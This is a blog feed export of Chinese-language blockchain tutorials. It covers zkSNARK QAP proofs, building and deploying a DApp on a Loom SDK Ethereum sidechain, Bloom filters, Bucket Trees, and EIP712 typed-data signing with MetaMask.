到目前为止，整个QAP的zkSNARK的证明过程逻辑已见雏形。 $\delta $ 偏移为了进一步“隐藏” $$V_{free}, W, Y$$，额外需要采用两个偏移: $$\delta_{free}, \delta_w 和 \delta_y$$。 $v_{free}(s)/w(s)/y(s)/h(s)$进行如下的变形，验证者用同样的逻辑验证。 $$v_{free}(s) \rightarrow v_{free}(s) + \delta_{free}t(s)$$$$w(s) \rightarrow w(s) + \delta_wt(s)$$$$y(s) \rightarrow y(s) + \delta_yt(s)$$$$h(s) \rightarrow h(s)+\delta_{free}(w_0(s) + w(s)) + \delta_w(v_0(s) + v_{in}(s) + v_{free}(s)) + (\delta_{free}\delta_w)t(s) - \delta_y$$ 总结：QAP和QSP问题类似。QSP问题主要用于布尔电路计算表达，QAP问题主要用于算术电路计算表达。将一个算术电路计算转化为QAP问题的过程，其实就是对电路中每个门电路进行描述限制的过程。通过朗格朗日定理，实现算术电路的多项式表达。QAP问题的zkSNARK的证明验证过程和QSP非常相似。 本文作者 Star Li，他的公众号星想法有很多原创高质量文章，欢迎大家扫码关注。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>零知识证明</tag>
        <tag>zkSNARK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 Loom SDK 搭建的以太坊侧链上运行 DApp]]></title>
    <url>%2F2019%2F05%2F06%2Fuse-loom-for-dapp%2F</url>
    <content type="text"><![CDATA[上一篇，我们在Loom 构建的DApp侧链上部署了智能合约，这篇文章就来基于侧链网络部署一个DApp（去中心化应用）。 应用如何连接 Loom 侧链之前我们在开发DApp时，我们会引入 web3.js 或 ethers.js 作为链和应用前端的桥梁，通过一个设置一个Provider 来和指定的节点进行通信，以web3.js 0.20 为例，代码大概是这样的： 12345678var web3Provider = window.ethereum; // ❶ var web3 = new Web3(web3Provider);var MyContract = web3.eth.contract(abiArray);// 使用合约地址实例化合约var contractInstance = MyContract.at(address);contractInstance.callMethod(function()); ❶ 行就是用来设置 provider, 如果我们的的浏览器安装了MetaMask 插件， 它会注入一个ethereum对象，也是通常推荐的方式。 不过目前（2019-05） MetaMask 还不支持连接 Loom 侧链，Loom 为此提供了一个 LoomProvider。 安装 LoomProviderLoomProvider 在 loom-js 包里，可以 npm 来安装，安装命令如下： 1npm install loom-js --save 除了 LoomProvider外 loom-js 中还有几个模块我们需要使用到，使用 ES6的 import { } from &#39;loom-js&#39; 的方式引入模块会比较方便，由于这个语法目前大多数浏览器依然不支持，不过我们可以使用 webpack 转化为 浏览器支持的 ES5 代码。 Webpack 安装与使用Webpack 安装同样使用 npm 来安装，命令如下： 1npm install webpack --save 同时建议把 webpack-dev-server 安装上，这样在开发过程中，我们修改的代码可以实时反映的浏览器中（俗称“热更新”），安装方式如下： 1npm install webpack-dev-server --save Webpack 配置为了方便把与合约交互的代码放在src/index.js（index.js 的代码编写见下节）中，把webpack生成的代码放在dist/bundle.js文件（这也是通常的作法），编写配置文件 webpack.config.js 如下： webpack.config.js123456789101112131415161718192021222324252627282930const webpack = require('webpack')var path = require('path')module.exports = &#123; entry: &#123; app: path.join(__dirname, 'src', 'index.js') &#125;, output: &#123; path: path.join(__dirname, 'dist'), filename: 'bundle.js' &#125;, devServer: &#123; historyApiFallback: true &#125;, node: &#123; fs: 'empty', child_process: 'empty', crypto: true, util: true, stream: true, path: 'empty', &#125;, externals: &#123; shelljs: 'commonjs shelljs', &#125;, optimization: &#123; minimizer: [] &#125;&#125; DApp 如何与 loom 侧链交互我们把所有的交互代码放在 index.js 的 App 类中，不过前端 index.html 引入的是 经过webpack 打包后的 bundle.js 文件。 初始化web3回顾初始化web3的代码，需要传入Provider对象，此时就需要用到 LoomProvider，更改后初始化web3的代码, 如下()： src/index.js123456789import &#123; LoomProvider&#125; from 'loom-js'export default class App &#123; initWeb3() &#123; this.web3 = new Web3(new LoomProvider(this.client, this.privateKey)) // ❶ &#125;&#125; ❶ 为初始化web3 代码， 构造 LoomProvider 对象时需要传入 client 对象和一个私钥，在侧链上发起的交易，将用这个私钥进行签名。 创建client对象添加 client 的创建函数 createClient() 代码如下： src/index.js12345678910111213141516171819202122import &#123; Client, LoomProvider&#125; from 'loom-js'export default class App &#123; createClient() &#123; // ❶ let writeUrl = 'ws://127.0.0.1:46658/websocket' let readUrl = 'ws://127.0.0.1:46658/queryws' let networkId = 'default' this.client = new Client(networkId, writeUrl, readUrl) this.client.on('error', msg =&gt; &#123; console.error('Error on connect to client', msg) console.warn('Please verify if loom command is running') &#125;) &#125; initWeb3() &#123; ... &#125; &#125; client 的创建需要的信息，和我们在 上一篇loom 上部署合约中 truffle.js 的配置相似，都是指定节点的 RPC 信息，可以参考loom 官方文档。 创建账号私钥及账号创建代码如下： src/index.js1234567891011121314151617181920212223import &#123; Client, LocalAddress, CryptoUtils, LoomProvider&#125; from 'loom-js'export default class App &#123; init() &#123; this.createClient(); this.createCurrentUserAddress(); this.initWeb3(); &#125; createClient() &#123; ... &#125; createCurrentUserAddress() &#123; // ❶ this.privateKey = CryptoUtils.generatePrivateKey() this.publicKey = CryptoUtils.publicKeyFromPrivateKey(this.privateKey) this.account = LocalAddress.fromPublicKey(this.publicKey).toString(); &#125; initWeb3() &#123; ... &#125;&#125; ❶ 行 createCurrentUserAddress 函数通过CryptoUtils创建私钥推导公钥创建账号。 构造合约对象上面完成了web3对象的创建，现在可以开始构造合约对象，用 initContract 来执行这个过程，代码如下： src/index.js1234567891011121314151617181920212223242526import NoteContract from '../build/contracts/NoteContract.json' // ❶export default class App &#123; init() &#123; this.createClient(); this.createCurrentUserAddress(); this.initWeb3(); this.initContract(); &#125; async initContract() &#123; const networkId = "13654820909954"; // ❷ this.currentNetwork = NoteContract.networks[networkId] if (!this.currentNetwork) &#123; throw Error('Contract not deployed on DAppChain') &#125; const ABI = NoteContract.abi; var MyContract = this.web3.eth.contract(ABI); // ❸ this.noteIntance = MyContract.at(this.currentNetwork.address); // ❹ &#125;&#125; 说明：❶ 从 Truffle 编译部署生成的Json文件引入 合约描述对像❷ 这是我们侧链的网络id，在上一篇 进行合约部署的时候，可以看到 Network id 的输出提示。 注: 在官方的示例中 networkId 使用的是 default， 不过我在实际运行时，使用 default 作为网络id会出错（找不到对应的合约部署地址）。 ❸ ❹ web3.js 0.20 构造合约对象的方式。 注: 我也尝试过使用 web3.js 1.0 版本去构造合约对象， 不过获得合约对象总是合约抽象 AbstractContact ，Google 半天没有找到方案，只好作罢。 调用合约方法直接使用 this.noteIntance 对象调用合约方法即可，和我们之前文章开发DApp时完全一样，如加载笔记的逻辑如下： src/index.js12345678910111213141516export default class App &#123; getNotes() &#123; var that = this; this.noteIntance.getNotesLen(this.account, function(err, len) &#123; // ❶ console.log(len + " 条笔记"); if (len &gt; 0) &#123; that.loadNote(len - 1); &#125; &#125;); &#125; loadNote(index) &#123; // 加载每一条笔记 ... &#125;&#125; 说明： ❶ 直接使用合约实例 this.noteIntance 调用合约的函数，传入参数及回调方法，可参考文档：web3.js 0.20 中文文档 完整代码在GitHub，切换到loom 分支查看。 运行 DApp前面我们安装了 webpack-dev-server 服务器， 可以使用 webpack-dev-server 加载 DApp 的跟目录，命令如下： 12345678910webpack-dev-server --hot --content-base ./dist``` 为了方便，可以在package.js 加入一条脚本:```js"scripts": &#123; "serve": "webpack-dev-server --hot --content-base ./dist"&#125; 这样就可以使用 npm run serve来启动DApp , DApp运行的url 是 http://localhost:8080/，在浏览器输入这个地址就可以看到DApp界面，如下图，大家尝试添加几条笔记。 注: 如果提示 webpack-dev-server命令找不到，可以使用npm install webpack-dev-server -g 全局安装 Loom 目前的缺陷在侧链上运行的DApp 交互响应时间好很多，不过当下任有一些问题。 无法和 MetaMask 配合使用前面在编写 DApp 如何与 loom 侧链交互的代码时，有一个创建账号的步骤，即页面刷新的时候，每次都会用CryptoUtils重新创建一个账号，账号没有很好的办法复用是个挺大的问题，希望loom 能早日配合 MetaMask 钱包使用（或者开发出自己的钱包插件）。 有一个方法是把私钥存储在localStorage，实例代码如下: 12345678const storedKey = localStorage.getItem('loomKey')let privKeyif (storedKey) &#123; privKey = CryptoUtils.B64ToUint8Array(storedKey);&#125; else &#123; privateKey = CryptoUtils.generatePrivateKey() localStorage.setItem('loomKey', CryptoUtils.Uint8ArrayToB64(privKey))&#125; 根据Loom 在 medium的这篇博客 说可以使用 ethers.js 的 signer 来通过 MetaMask 签名，不过我自己试验下来，并没有成功，希望成功的朋友可以留言讨论。 事件处理不完善loom-js 对LoomProvider事件支持还不够完善，比如，我们添加事件监听代码： 1234this.event = this.noteIntance.NewNote()this.event.watch(function(err, result) &#123; console.log(" watch event: " + err);&#125;); 会提示错误： 1watch event: Error: Method &quot;eth_getFilterLogs&quot; not supported on this provider 好在与侧链交互速度较快，这个问题不算严重，可以在发起交易之后，通过get的方式读取状态变化。 参考 loom-js loom sdk 文档 Plasma Cash Smart Contracts deploying-your-first-app-to-loom-plasmachain Truffle 官方文档-中文版 加入知识星球，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>扩容技术</category>
        <category>Loom</category>
      </categories>
      <tags>
        <tag>DApp</tag>
        <tag>Loom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[白话布隆过滤器（Bloom Filter）]]></title>
    <url>%2F2019%2F04%2F30%2Fbloom_filter%2F</url>
    <content type="text"><![CDATA[要判断一个元素是不是在一个集合里，比较容易想到的方法是用数组，链表这样的数据结构把元素保存起来，然后依次比较来确定。 但是随着集合的变大，上面的这种方法就面临几个问题，首先比较的速度随着数据量的增加而变慢，其次存储集合的空间也越来越大。 为了解决上面的问题，就引入了布隆过滤器（Bloom Filter） 布隆过滤器原理布隆过滤器的原理就是当一个元素被加入到集合的时候，用K个Hash函数将元素映射到一个位图中的K个点，并且把这个点的值设置为1，在每次检索的时候我们看一下这个点是不是都是1就知道集合中有没有这个元素了。 这样说可能比较抽象，举个例子： 我们假设K是2，有Hash1和Hash2两个哈希函数 12Hash1 = n%3Hash2 = n%8 然后我们创建一个名叫bitMap长度是20的位图 1bitMap=[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] 这个时候，我们要将7，存入到这个集合中 1n = 7 分别用Hash1和Hash2计算n哈希后的值 12Hash1 -&gt; 1Hash2 -&gt; 7 我们把bitMap对应的值置为1，从0开始 1bitMap=[0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] 这样下次我们来查找7在不在这个集合的时候就可以用Hash1和Hash2计算完以后在bitMap集合中查找对应位置是否都是1，如果都是1则一定在集合中。 如果再在集合中插入13 分别用Hash1和Hash2计算n哈希后的值 123n = 13Hash1 -&gt; 1Hash2 -&gt; 5 我们把bitMap对应的值置为1，从0开始 1bitMap=[0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] 这个时候我们发现1被映射到了两次，但是并不影响我们在集合[7, 13]中快速找到7或者13。 但是当插入的数据量大幅提升的时候，甚至bitMap全部被置为1的时候问题就很严重了，误识率就非常高了，这个也是根据不同场景实现布隆过滤器所要考虑的问题。 尽管有这样的问题，但是仍然不能掩盖布隆过滤器的空间利用率和查询时间远超其他算法，插入数据和查询数据的时间复杂度都是O(k) 应用场景比较典型的应用场景就是检查垃圾邮箱的地址，比如我建立了一个垃圾邮件的布隆过滤器，当新邮件到来的时候我要快速的判断这封邮件是不是垃圾邮件。 还可以用来判断一个URL是不是恶意链接等等。 以太坊大量的用到了布隆过滤器，用来定位查找日志等。 本文作者清源，欢迎关注清源的博客，不定期分享一些区块链底层技术文章。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>Bloom Filter</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Loom SDK 搭建的以太坊侧链并部署智能合约]]></title>
    <url>%2F2019%2F04%2F29%2Fuse-loom%2F</url>
    <content type="text"><![CDATA[前两天写了一篇 用Truffle开发一个链上记事本 ，很多人讲，这样写一条笔记成本该多高呀，这篇我们看看如何把链上记事本智能合约迁移到Loom SDK 搭建的以太坊侧链，在下一篇会介绍如何来用loom.js重写这个DApp。 关于 LoomLoom （或者称 Loom Network） 是一支探索区块链二层扩容方面技术的团队，他们在尝试构建可用于游戏等领域的二层网络（Layer2）平台，目前两个开发的两个重要产品是 Loom PlasmaChain 及 Loom SDK。 Loom PlasmaChainLoom PlasmaChain 是一条实现了 Plasma Cash 框架模型的高性能 DPoS 侧链（提供1–3秒的交易确认时间）。 这条侧链带来的特点是显而易见的，它可以获得由以太坊底层网络的安全背书，让我们使用在以太坊上发布的Token（包含 ERC20和 ERC721支持），又可以享受 DPos 共识带来的高性能。 以太坊交易确认至少是15秒以上，并且需要消耗一笔 Gas 费用，当然因此牺牲了一些去中心化。 这张图可以表明 PlasmaChain 与 以太坊的关系，它未来会链接多条侧链，据官方搞 PlasmaChain 集成排名前100的ERC20代币，其中包含6种稳定币。 Loom SDK（工具集）Loom SDK 则让开发者快速构建自己的区块链(DApp侧链)，同时也提供了一些工具开发部署应用，它包含内容有： 一个可执行的 loom 命令行工具， 用于创建一条自己的应用链。 有时狭义的Loom SDK就是单指这个工具 一些其他工具，如用来在主链和侧链之间转移资产的工具：plasma-cli gateway-cli。 用来部署合约及开发DApp 的 JavaScript SDK， 包含 Loom [Truffle](https://learnblockchain.cn/docs/truffle/) Provider 及 loom-js， 这篇文章后面会介绍他的使用。 用来部署合约及开发DApp 的 Go SDK。 以及开发游戏相关的 SDK： Cosos SDK、Unity SDK。 本篇文章重点就是要介绍如何使用 Loom SDK 创建一条自己的链并部署应用。 Loom 安装 &amp; 启动区块链loom 安装loom 命令行工具安装很简单，直接下载可执行文件，在控制台输入： 12wget https://private.delegatecall.com/loom/osx/stable/loomchmod +x loom 大家可以把 loom 加入到环境变量里，方便后面使用。 我使用的系统是 Mac OS， 如果你使用 Linux， 则 wget 后面的 url 是 https://private.delegatecall.com/loom/linux/stable/loom ，Window 暂时不支持，可以选择虚拟机。 初始化链123mkdir loom-chain # 为侧链创建一个目录cd loom-chainloom init 初始化命令会生成genesis.json 和 chaindata目录，genesis.json 是这条侧链的创世纪块配置，chaindata目录用户保存区块数据。 运行区块链使用以下的命令可以启动刚刚初始化的DApp侧链： 1loom run 输出像下面这样： 12345678I[29046-04-29|20:46:50.356] Loading IAVL Store module=loomI[29046-04-29|20:46:50.362] Using simple log event dispatcherI[29046-04-29|20:46:50.368] Deployed contract vm=plugin location=coin:1.0.0 name=coin address=default:0xe288d6eec7150D6a22FDE33F0AA2d81E06591C4dInit DPOS Params &amp;dpos.DPOSInitRequest&#123;Params:(*dpos.Params)(0xc000e44dc0), Validators:[]*types.Validator&#123;(*types.Validator)(0xc000e46dc0)&#125;, XXX_NoUnkeyedLiteral:struct &#123;&#125;&#123;&#125;, XXX_unrecognized:[]uint8(nil), XXX_sizecache:0&#125;I[29046-04-29|20:46:50.369] Deployed contract vm=plugin location=dpos:1.0.0 name=dpos address=default:0x01D10029c253fA02D76188b84b5846ab3D19510DE[29046-04-29|20:46:50.374] Couldn&apos;t connect to any seeds module=p2pI[29046-04-29|20:46:50.374] Starting RPC HTTP server on [::]:46658 module=query-serverI[29046-04-29|20:46:50.374] Starting RPC HTTP server on 127.0.0.1:9999 module=query-server 启动的侧链运行在端口46658上， 可以通过区块链浏览器 https://blockexplorer.loomx.io/?rpc=http://127.0.0.1:46658 , 查看这条测试链的出块数据，如图： https://blockexplorer.loomx.io/ 是Plasma Chain的区块链浏览器，在区块浏览器浏览器的下方可以选择链接的RPC 服务器，选择本地的IP及端口。 现在链已经准备好了，接下来就是开发及部署DApp了，我们依然使用 Truffle 进行开发，不熟悉可参考： Truffle 官方开发文档-中文 在侧链上开发和部署智能合约在用Truffle开发一个链上记事本文章里，以及介绍了如何开发这个DApp 这里不再重复介绍。 这个链上记事本的源码在GitHub ， 进行下面的操作之前，需要 git clone 到本地： 12&gt; git clone git@github.com:xilibi2003/note_dapp.git&gt; npm install # 安装相应的依赖 Truffle 配置侧链网络原来的代码里，Truffle 连接的是以太坊网络，因此需要修改 truffle.js 添加刚刚创建的侧链网络，和我们之前介绍的 使用 truffle-hdwallet-provider 连接 Infura 网络原理类似，连接侧链网络也需要提供一个Provider，它是 Loom Truffle Provider， 修改配置之前先安装它： 1npm install loom-truffle-provider --save 然后修改配置文件 truffle.js，（这有有一份 Truffle 配置 文档），参考配置如下： 123456789101112131415161718const &#123; readFileSync &#125; = require('fs')const LoomTruffleProvider = require('loom-truffle-provider')const chainId = 'default'const writeUrl = 'http://127.0.0.1:46658/rpc'const readUrl = 'http://127.0.0.1:46658/query'const privateKey = readFileSync('./priv_key', 'utf-8')const loomTruffleProvider = new LoomTruffleProvider(chainId, writeUrl, readUrl, privateKey)module.exports = &#123; networks: &#123; loom_dapp_chain: &#123; provider: loomTruffleProvider, network_id: '*' &#125; &#125;&#125; 在配置里，我们新加入一个网络 loom_dapp_chain ，这个网络有 LoomTruffleProvider 提供，http://127.0.0.1:46658/ 是 使用 loom run 启动侧链节点提供的RPC 服务， 细心的同学应该已经发现了 priv_key， 它是用来部署合约到侧链上账号的私钥文件，下面就来创建它。 配置链接到其他的侧链，可以参考PlasmaChain 测试网 创建测链账号loom 工具提供了选项来创建账号，在项目note_dapp目录下，执行如下命令： 1$ loom genkey -k priv_key -a pub_key 输出结果像下面（当然大家的账号和我的会不一样）： 12local address: 0x8b7A68cFf3725ca1b682XLb575bC891e381138ef8local address base64: i3poz/NyXKG2gv5XW8iR44ETjvg= 这个命令会在当前文件夹加生成私钥和公钥文件： priv_key 和 pub_key ， priv_key 文件里包含后面用来把合同部署到侧链的私钥。 部署到DApp侧链执行部署时（需要先确定链当前在运行），使用 –network 指定网络，命令如下： 1truffle migrate --network loom_dapp_chain 输出的结构像下面： 12345678910111213141516171819202122232425262728293031323334353637Compiling ./contracts/Migrations.sol...Compiling ./contracts/NoteContract.sol...Writing artifacts to ./build/contractsStarting migrations...======================&gt; Network name: &apos;loom_dapp_chain&apos;&gt; Network id: 13654820909954&gt; Block [gas](https://learnblockchain.cn/2019/06/11/gas-mean/) limit: 0.......2_deploy_contract.js==================== Deploying &apos;NoteContract&apos; ------------------------ &gt; transaction hash: 0x88a6131cb89fcf...d72d3f92ceb2e &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x0611Afc2fac9B72f5a75E1BC330Ba4c5da103217 &gt; account: 0x8b7A68cFf3725ca1b682XLb575bC891e381138ef8 &gt; balance: 0 &gt; gas used: 0 &gt; gas price: 0 gwei &gt; value sent: 0 ETH &gt; total cost: 0 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0 ETH 从这个输出会列出部署的网络名、网络id、交易hash、合约地址等信息，用样部署动作也在 build 目录下生成对应的文件contracts/NoteContract.json。 与侧链上的智能合约进行交互Truffle 提供了一个控制台 truffle console 启动控制台首先通过 --network 选项指定连接到DApp侧链loom_dapp_chain， 进入控制台，命令如下： 1truffle console --network loom_dapp_chain 进入控制台后，控制台提示文字是这样： 1truffle(loom_dapp_chain)&gt; 然后我们就可以在这个控制台内执行交互命令。 获取合约实例12truffle(loom_dapp_chain)&gt; let instance = await NoteContract.deployed()truffle(loom_dapp_chain)&gt; instance 查看 instance ，会输出 instance 实例的详情，使用的Provider, 包含哪些方法，ABI 描述等， 结果像下面： 1234567891011121314151617181920212223242526TruffleContract &#123;...web3: Web3 &#123; class_defaults: &#123; from: '0x8b7A68cFf3725ca1b682XLb575bC891e381138ef8', gas: 6721975, gasPrice: 20000000000 &#125;,currentProvider: TruffleLoomProvider &#123; _engine: [LoomProvider], send: [Function], _alreadyWrapped: true &#125;, network_id: '13654820909954' &#125;, methods: &#123; 'notes(address,uint256)': &#123; ... &#125;, 'addNote(string)': &#123;... &#125;, 'getNotesLen(address)': &#123;...&#125;, 'modifyNote(address,uint256,string)': &#123; ... &#125;, abi: [...]&#125; 通过合约实例调用合约函数调用合约添加一条笔记： 1truffle(loom_dapp_chain)&gt; instance.addNote("abc"); 获取当前账号（后面查看笔记数量函数需要使用账号作为参数，因此先获取下账号）： 12truffle(loom_dapp_chain)&gt; let accounts = await web3.eth.getAccounts()truffle(loom_dapp_chain)&gt; accounts[0] 这时控制台会打印出账号地址： 1‘0x8b7A68cFf3725ca1b682XLb575bC891e381138ef8’ 查看这个下这个账号的笔记条数： 1234truffle(loom_dapp_chain)&gt; let noteNum = await instance.getNotesLen(&quot;0x8b7A68cFf3725ca1b682XLb575bC891e381138ef8&quot;)truffle(loom_dapp_chain)&gt; noteNum.toNumber()# 输出结果1 调用其他的方法类似，不一一讲解，可以参考Truffle 文档 - 与合约交互 下一篇将继续介绍在DApp 中怎么和合约进行交互。 参考文章 loom 官网 PlasmaChain与排名前100的ERC20代币集成，通过多币种支持实现闪电级的第2层稳定币支付 https://plasma.io/ Loom SDK 介绍 Truffle 官方文档-中文版 加入知识星球，和一群优秀的区块链从业者一起学习。深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>扩容技术</category>
        <category>Loom</category>
      </categories>
      <tags>
        <tag>Loom</tag>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解 Bucket Tree]]></title>
    <url>%2F2019%2F04%2F24%2Fbucket-tree%2F</url>
    <content type="text"><![CDATA[Bucket Tree结合了默克尔树和哈希表的特点，如果想要深入了解Bucket Tree就必须掌握默克尔树和哈希表。 Merkle Tree大多用来进行对比验证处理，特别是在分布式环境下进行比对或验证的时候可以大大减少数据传输量和计算的复杂度。 Merkle(默克尔)树结构解析Merkle 树特点 默克尔树是一种树，一般是二叉树，也可以是多叉树； 默克尔树的叶子节点可以是数据项，也可以是数据项的哈希值； 非叶子节点的数据项是由其叶子节点Hash计算得到的； Merkle 树原理默克尔树是自底向上构建的，下面就是一颗典型的默克尔树。 首先计算ENTRY1-ENTRY4单元的数据哈希，然后分别存入到对应的叶子节点，这些叶子节点分别是HASH0-0,HASH0-1,HASH1-0,HASH1-1。 接着将相邻节点的哈希值合并成一个字符串，然后计算这个字符串的哈希值，得到的就是这两个节点父节点的哈希值。 如果用公式表示的话就是这样： 1HASH 0 = Hash（HASH 0-0 + HASH 0-1） 如果树节点的个数是单数，就对它直接进行哈希运算，或者复制一次这个节点的哈希值，凑齐偶数个节点。 重复上述过程，自底向上就可以构建整个默克尔树了。 Tips: 若两颗树的根哈希一直，则这两棵树的结构，节点内容必然相同。默克尔树的优势当一个节点内容发生变化的时候，仅需要计算从该节点到根路径上所有节点节点的哈希，减少计算量，同时也方便快速定位数据发生变化的位置。 哈希表哈希表也称散列表，根据键（key）快速定位值（value）的存储位置的数据结构。 Bucket TreeBucket Tree拓展了哈希表的概念，引入了一个桶（bucket），也就是哈希桶。 其结构如下图所示: KEY2和KEY3映射到相同的152号桶里。 Bucket tree在扩展哈希表的同时，又在哈希表上建立了默克尔树。 哈希表由一系列的哈希桶（bucket）组成，每个桶中存储着若干被散列到该桶中的数据项（entry）所以数据项按序排列，每一个哈希桶有一个哈希值来标识整个桶，该哈希值是桶内所有数据通过哈希计算所得。 除了底层的哈希表外，上层是一系列的默克尔树节点，一个默克尔树节点对应着下层的N个哈希桶或者默克尔树节点，这个N也称作默克尔树的聚合度。 Bucket Tree 设计目的： ​利用默克尔树的特点，使每次树状态改变，重新计算哈希的代价最小； 利用哈希表进行底层数据的维护，使得数据项均匀分布； 例如上图中，一条新的数据项entry5插入，该数据项被散列到POS为1的桶中。该桶，即从该桶至根节点上所有的节点被标为粉红色，即为脏节点。仅对这些脏节点进行哈希重计算，便可得到一个新的哈希值用来代表新的树状态。 由于bucket tree是一棵固定大小的树（即底层的哈希表容量在树初始化之后，就无法更改了），随着数据量的增大，采用散列函数将所有的数据项进行均匀散列可以避免数据聚集的情况发生。 Bucket tree有两个重要的可调参数 capacity：表示哈希表的容量，该值越大，整课树所能容纳的数据项个数就越多，在聚合程度不变的前提下，树越高，从叶子节点到根节点的路径越长，哈希计算次数也越多。 aggreation：表示一个父节点对应的孩子节点的个数，该值越大，表示树的收敛速度越快，在哈希表容量不变的前提下，树更低，从叶子节点到根节点路径越短，哈希计算次数也越少。但是每个默克尔树节点的size就越大，增加磁盘IO开销。 Tips: 当有比较多数据变更的时候，非常容易散列到不同bucket，这个时候可以并行计算新bucket的哈希值，加速构建默克尔树。 如果Bucket tree树比较大，并且用数据库来存储的话，加上读cache可以显著的提升性能。 本文作者清源，欢迎关注清源的博客，不定期分享一些区块链底层技术文章。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>Bucket Tree</tag>
        <tag>Merkle树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解 EIP712 - 类型结构化数据 Hash与签名]]></title>
    <url>%2F2019%2F04%2F24%2Ftoken-EIP712%2F</url>
    <content type="text"><![CDATA[区块链能够实现去中心化无信任情形下的资产安全，很关键的一点儿就是充分的把公私钥体系引入并使用起来了。通过对每笔交易进行私钥签名的方式保证每个人都只能花费他自己账号里的钱，别人也可以很容易的去验证某笔交易确实是账号所有人所发出的。其实私钥不只是可以签名交易，还可以签名其它数据。 排名第一的去中心化交易所 IDEX下面是从 etherscan 上截取的以太坊去中心化交易所在过去七天的交易量分布图，我们可以清楚的看到，IDEX 的交易量是远远超过其它交易所的。 IDEX 有啥特别的呢？与其它去中心化交易所不同，IDEX 采取的是中心化交易戳合，去中心化结算的方式，资产的保存和结算都是在智能合约里，交易所无法动用任何用户资产，但同时用户又能享受中心化交易撮合的快速方便。 关键的签名IDEX 需要在中心化服务器上进行订单的撮合，如何保证订单不会被交易所更改呢？核心就在于我们的每笔交易，在发送到中心化服务器前都会用用户自己的私钥进行签名，然后智能合约在进行结算时会对用户签名进行验证。如果中心化服务器对订单数据有任何改动，都无法通过智能合约的校验。 EIP712 的改进但是，上一步提到的签名有个很大的缺陷，我们能看到的签名信息只能是像下面这样的一串哈希值，至于生成这个哈希值的原始数据，我们是无从得知的，进而也就不易验证。 使用 EIP712 之后，我们看到的签名窗口就是下面这样的了。在这里，我们不只是看到一串哈希数据了，而是能看到完整的签名数据，进而可以验证所签名的数据是不是正确的数据，有没有被攥改。 如何把 EIP712 用起来下面我们以一个拍卖场景为例，看看如何在产品中把 EIP712 用起来。 定义数据结构首先，用 JSON 格式列出用户所要签名的数据。 比如作为一个拍卖应用，需要签名的就是下面的投标数据： 123456789&#123; amount: 100, token: “0x….”, id: 15, bidder: &#123; userId: 323, wallet: “0x….” &#125;&#125; 然后，我们可以从上面的代码片段中提炼出两个数据结构: 竞标 Bid，它包括以 ERC20 代币资产和拍卖 id 确定的出价金额，以及身份 Identity，它指定了用户 id 和 用户钱包地址。下一步，将 Bid 和 Identity 定义为结构体，就可以写出下面的 solidity 合约代码了。 可以通过 EIP712 协议草案查看 EIP712 所支持的完整数据类型列表，比如地址、 bytes32、 uint256等。 123456789Bid: &#123; amount: uint256, bidder: Identity&#125; Identity: &#123; userId: uint256, wallet: address&#125; 设计域分隔符（domain separator）主要防止一个 DApp 的签名还能在另一个 DApp 中工作，从而导致签名冲突。拿拍卖为例子的话，一个拍卖应用里的投标请求竟然在另外一个拍卖应用里也能执行成功，可能会就导致不必要的损失。 具体来说，域分隔符就是下面这样的结构和数据： 1234567&#123; name: "Auction dApp", // DApp 的名字 version: "2", // DApp 的版本 chainId: "1", // [EIP-155] 定义的 chainId verifyingContract: "0x1c56346...", // 验签合约地址 salt: "0x43efba6b4..." // 硬编码到合约和 DApp 中的一个随机数值&#125; 为 DApp 编写签名代码DApp 的前端 Javascript 代码需要能够请求 MetaMask 对相应的数据签名。 备注：需要安装最新版的 MetaMask 浏览器插件钱包 首先，定义数据类型: 123456789101112131415const domain = [ &#123; name: "name", type: "string" &#125;, &#123; name: "version", type: "string" &#125;, &#123; name: "chainId", type: "uint256" &#125;, &#123; name: "verifyingContract", type: "address" &#125;, &#123; name: "salt", type: "bytes32" &#125;,];const bid = [ &#123; name: "amount", type: "uint256" &#125;, &#123; name: "bidder", type: "Identity" &#125;,];const identity = [ &#123; name: "userId", type: "uint256" &#125;, &#123; name: "wallet", type: "address" &#125;,]; 接下来，定义域分隔符和需要签名的应用数据 1234567891011121314const domainData = &#123; name: "Auction dApp", version: "2", chainId: parseInt(web3.version.network, 10), verifyingContract: "0x1C56346CD2A2Bf3202F771f50d3D14a367B48070", salt: "0xf2d857f4a3edcb9b78b4d503bfe733db1e3f6cdc2b7971ee739626c97e86a558"&#125;;var message = &#123; amount: 100, bidder: &#123; userId: 323, wallet: "0x3333333333333333333333333333333333333333" &#125;&#125;; 像下面这样组合这些变量： 12345678910const data = JSON.stringify(&#123; types: &#123; EIP712Domain: domain, Bid: bid, Identity: identity, &#125;, domain: domainData, primaryType: "Bid", message: message&#125;); 接下来，通过调用 eth_signTypedData_v3 来进行签名： 1234567891011121314151617web3.currentProvider.sendAsync(&#123; method: "eth_signTypedData_v3", params: [signer, data], from: signer&#125;,function(err, result) &#123; if (err) &#123; return console.error(err); &#125; const signature = result.result.substring(2); const r = "0x" + signature.substring(0, 64); const s = "0x" + signature.substring(64, 128); const v = parseInt(signature.substring(128, 130), 16); // The signature is now comprised of r, s, and v. 